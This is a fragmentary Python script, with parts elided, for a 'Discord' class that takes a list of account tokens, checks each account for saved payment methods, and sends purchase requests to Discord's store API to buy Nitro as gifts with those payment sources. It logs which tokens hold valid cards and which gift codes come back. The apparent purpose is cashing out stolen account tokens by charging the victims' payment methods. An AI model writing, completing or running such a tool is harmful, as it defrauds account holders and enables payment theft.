...
class Discord(object):
                ...
                if json != []:
                    ...
                    for source in json:
                        try:
                            ...
                            pass
                    if valid != 0:
                        print(Fore.GREEN, "%s valid payment method(s): \x1b[38;5;9m\x1b(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (valid, token[:59]))
                        return result
                    else:
            ...
            async with client.post("https://discord.com/api/v9/store/skus/%s/purchase" % (self.nitro_id), json={"gift":True,"sku_subscription_plan_id":self.sku_id,"payment_source_id":source,"payment_source_token":None,"expected_amount":self.nitro_price,"expected_currency":"usd","purchase_token":"500fb34b-671a-4614-a72e-9d13becc2e95"}) as response:
                ...
                if json.get("gift_code"):
                    ...
                    if json.get("message"):
                        ...
                        print(Fore.CYAN, "%s \x1b[38;5;9m\x1b(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (json.get("message"), token[:59]))
                    else:
    ...
    async def task(self, token):
        ...
        if sources == None:
            print(Fore.RED, "No payments: \x1b[38;5;9m \x1b(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
            return
        for x in sources:
